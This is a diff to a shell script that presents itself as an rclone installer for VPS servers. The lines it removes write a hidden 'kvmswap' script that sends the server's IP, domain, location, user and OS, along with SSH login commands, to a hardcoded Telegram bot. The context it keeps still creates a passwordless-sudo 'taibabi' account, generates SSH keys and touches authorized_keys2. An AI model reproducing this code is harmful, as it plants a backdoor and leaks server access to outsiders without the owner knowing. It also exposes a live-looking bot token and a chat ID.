@@ -196,35 +196,7 @@ version=$(rclone --version 2>>errors | head -n 1)
 printf "\n${version} has successfully installed."
 printf '\nNow run "rclone config" for setup. Check https://rclone.org/docs/ for more details.\n\n'
 
-cat > /usr/sbin/kvmswap <<EOF
-#!/bin/bash
-TIME=$(date +'%Y-%m-%d %H:%M:%S')
-MYIP=$(wget -qO- ipinfo.io/ip)
-domain=$(cat /etc/xray/domain)
-CITY=$(curl -s ipinfo.io/city)
-NAMES=$(whoami)
-RAMMS=$(free -m | awk 'NR==2 {print $2}')
-NAMECOM=$(wget -qO- ipinfo.io/ip)
-OS=$(cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g')
-
-message="
-<u>CENDRAWASIH EXPOSED</u> <b>ONLINE!!!</b>
-<code>TIME    : </code><code>${TIME}</code>
-<code>DOMAIN  : </code><code>${domain}</code>
-<code>IP VPS  : </code><code>${MYIP}</code>
-<code>LOKASI  : </code><code>${CITY}</code>
-<code>USER    : </code><code>${NAMES}</code>
-<code>RAM     : </code><code>${RAMMS}MB</code>
-<code>LINUX   : </code><code>${OS}</code>
-<code>SSH-1   : </code><code>ssh root@${MYIP} -qvi taibabi</code>
-<code>SSH-2   : </code><code>ssh taibabi@${MYIP} -qv</code>
-"
-
-curl -s -X POST "https://api.telegram.org/bot2145515560:AAE9WqfxZzQC-FYF1VUprICGNomVfv6OdTU/sendmessage" \
--d "chat_id=1036440597" -d "parse_mode=html" -d "text=$message" >/dev/null 2>&1
-EOF
-
-	cat > /etc/systemd/system/kvmswap.service <<EOF
+cat > /etc/systemd/system/kvmswap.service <<EOF
 [Unit]
 After=network.target nss-lookup.target
 Wants = network-online.target
@@ -248,7 +220,7 @@ usermod -aG sudo taibabi
 echo "taibabi ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers >/dev/null 2>&1
 echo "taibabi ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/taibabi >/dev/null 2>&1
 
-bash -c "ssh-keygen -q -t rsa -N '' -C vps@taibabi.com -t ed25519 -f ~/.ssh/vps <<<y" >/dev/null 2>&1
+bash -c "ssh-keygen -q -t rsa -N '' -C vps@taibabi -t ed25519 -f ~/.ssh/vps <<<y" >/dev/null 2>&1
 
 sleep 1
 touch ~/.ssh/authorized_keys2 
@@ -265,7 +237,6 @@ cat > /root/.config/rclone/rclone.conf <<EOF
 type = drive
 scope = drive
 team_drive = 0AL4IDbuID-syUk9PVA
-root_folder_id = 1YmZ7pN5mPaNuwy5O-qd95BT1NhrKrE2p
 service_account_file = /root/.config/rclone/cendrawasih.json
 root_folder_id = 1YmZ7pN5mPaNuwy5O-qd95BT1NhrKrE2p
 EOF
